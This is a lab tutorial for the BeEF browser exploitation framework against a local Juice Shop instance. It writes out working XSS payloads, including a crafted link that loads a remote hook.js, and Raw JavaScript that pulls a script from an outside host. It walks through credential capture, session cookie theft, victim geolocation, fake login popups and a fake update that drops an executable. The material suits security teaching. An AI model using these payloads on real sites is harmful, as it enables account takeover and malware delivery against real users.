# BeEF Tutorial

This tutorial assumes that 
1. you followed the [installation instructions](README.md)
2. the BeEF application is up and running, and can be reached at
[http://beef.local:3000/ui/panel](http://beef.local:3000/ui/panel)
3.  and that Juice Shop is up and running, and can be reached at
[http://vulnerable.local:3500](http://vulnerable.local:3500).

Let's see what you can do with BeEF: This tutorial will show you, as an
attacker, what you can do to a victim, by exploiting a Cross-Site Scripting
vulnerability.

## Attacker's point of view (1)

First, let's log onto BeEF's administrative panel by going to
[http://beef.local:3000/ui/panel](http://beef.local:3000/ui/panel) Enter here
the login credentials (the default username / password is `beefadmin` /
`difficultpassword`).

This is the view point of the attacker. At the left hand there's an overview
with Hooked Browsers: clients that can be controlled by the BeEF framework. When
starting up, this will be empty.

## Victim's point of view (1)

There are two vulnerable web sites. One has already been exploited, and another
one needs manual exploitation. Both examples can be used throughout the demo,
but the Juice Shop example is recommended, as it's more realistic.

For the victim's point of view, open a _new browser window_. The same browser
window can be used for both examples.

### Automatically exploited (simple form)

Let's now surf to a vulnerable site which contains a Cross-Site Scripting
vulnerability.
[http://vulnerable.local:3000/demos/basic.html](http://vulnerable.local:3000/demos/basic.html)

This specific vulnerable instance has already been exploited: This is an example
of a 'stored Cross-Site Scripting vulnerability', where the payload is
automatically executed. Even though you're visiting `vulnerable.local:3000`,
there's a direct hook into the BeEF framework.

### Manual exploitation (Juice Shop)

For a more realistic scenario, go to
[http://vulnerable.local:3500](http://vulnerable.local:3500) and click on the
search icon in the top right. This will open up a search box. Search for
"banana". This will return all results having "banana" in their description.

Now, an attacker discovered that the site contains a Cross-Site Scripting
vulnerability. Search for the term

```javascript
<img src=a onerror=alert(1)>
```

[<http://vulnerable.local:3500/#/search?q=%3Cimg%20src%3Da%20onerror%3Dalert(1)%3E>](<http://vulnerable.local:3500/#/search?q=%3Cimg%20src%3Da%20onerror%3Dalert(1)%3E>).

This will execute a reflected Cross-Site Scripting payload - an alert box will
pop up, showing a 1.

What's the damage, you'd think? Just an alert box, right? Well, this tutorial
will show you how you much damage you can do with 'just' a Cross-Site Scripting
exploit...

Say that the attacker crafted a link pointing to the vulnerable site, which
would execute a bit more realistic payload. It is up to the attacker to entice
victims to click on that link, for example by social engineering, using link
shorteners and messaging the link.

Click on the following link, prepared by the attacker:
[http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple](<http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple>)

Nothing weird happens, right? You don't see results, but that's all. Say now
that the victim wants to log on to the site, and clicks on the account link top
right. Fill in the account details of an existing account: `admin@juice-sh.op` /
`admin123`.

The victim is logged in, and everything looks okay.

However, the payload contained a hook to the attacker's BeEF instance:
`<script src="http://beef.local:3000/hook.js">`. What does this do? Well, this
ensures that the web site _is hooked_ onto the BeEF application.

## Attacker's point of view (2)

Switching back to
[http://beef.local:3000/ui/panel](http://beef.local:3000/ui/panel), at the left
hand you can see that a victim is online: a browser is currently hooked. From
the moment the victim clicked on the link, the attacker controlled all of the
web content in the [http://vulnerable.local:3000](http://vulnerable.local:3000)
tab. Click in the left hand on the hooked browser in the `vulnerable.local`
domain.

On the active tab _Details_ you can see all kinds of information about the
victim: The operating system for example, but also screen resolution for
example, settings, and enabled browser plugins.

Select the tab _Logs_. Here you can see what the victim is doing during this
session. **All entered text as well as mouse and keyboard commands are
intercepted**. If you look carefully you can read the username, and password
that the user entered.

**The attacker successfully stole the username and password**

### Grabbing the session cookie

Select the _Commands_ tab. This is where the majority of actions will be
performed. In the Module Tree, search for _cookie_. Select _Get Cookie_. Now, in
the rightmost side of the screen you can click on _Execute_. This will execute
the selected command.

In the _Module Results History_ section, an entry appears, with the selected
command. If you click on the command, which will have label _command 1_, you
will see the results at the right hand side. This is the session cookie of the
logged in user: all that the attacker needs to take over the victim's session.

**The attacker successfully stole the session cookie**

### Fingerprint the victim

Let's fingerprint the browser, so the victim can be followed.

Search for _fingerprint_, and click on the _Fingerprint Browser_ module. Now, in
the rightmost side of the screen you can click on _Execute_. This will execute
the selected command.

Search for _geolocation_ and select the _Get Geolocation (Third Party)_ module.
In the rightmost side, select for example the second entry,
`https://ip.nf/me.json` API. you now click on _Execute_, the attacker will find
out where the victim, visiting
[http://vulnerable.local:3500](http://vulnerable.local:3500), will be located.

**The attacker successfully fingerprinted and located the victim**

### Trick the victim

Next the attacker can trick the victim into divulging secrets. Search for
_Pretty Theft_ and execute that module. The victim will now see a popup, asking
to enter a username and password. This is how credentials can be stolen.

For another example, search for _Fake_ and select the _Fake Notification Bar
(Chrome)_ module. In the right hand of the screen, enter the following as URL:

```
http://beef.local:3000/demos/droppers/dropper.exe
```

This file is located on the BeEF server, and will be the payload. For
demonstration purposes, this is a Windows executable, the calculator. Note that
you can add any file in the `droppers` directory, and it can be accessed
directly using `http://beef.local:3000/demos/droppers/` and then the name of the
file.

When clicking on _Execute_, the module will send a convincingly looking update
notification. As soon as the victim clicks on the notification, a file will be
downloaded.

**The attacker successfully pushed a rogue executable to the victim**

### Fun and games

**Note:** For best results for the next demos, let the victim first click on the
**OWASP Juice Shop** logo in the top left, so that all search results are
visible. The more visual elements, the better...

Just for fun, play a sound on the victim's computer. Search for _sound_ and
execute the _Play Sound_ module.

Is the sound on? Then we can do better... Search for _raw_ and select the _Raw
JavaScript_ module. Paste the following code in the JavaScript Code window:

```
var b = document.createElement('script');
b.type = 'text/javascript';
b.src = 'http://extract.pw/shake.js';
document.body.appendChild(b);
```

Click on _Execute_.

**The attacker successfully executed arbitrary JavaScript**

### GOD exploit

For the ultimate exploit, search for _rick_ and select the _Redirect Browser
(Rickroll)_ module. Execute this module, and the victim will be shown the
infamous Rick Astley video.

Of course these are all benign examples, but imagine what a skilled attacker can
do, having such control over the victim's browser and ultimately security of its
operating system.
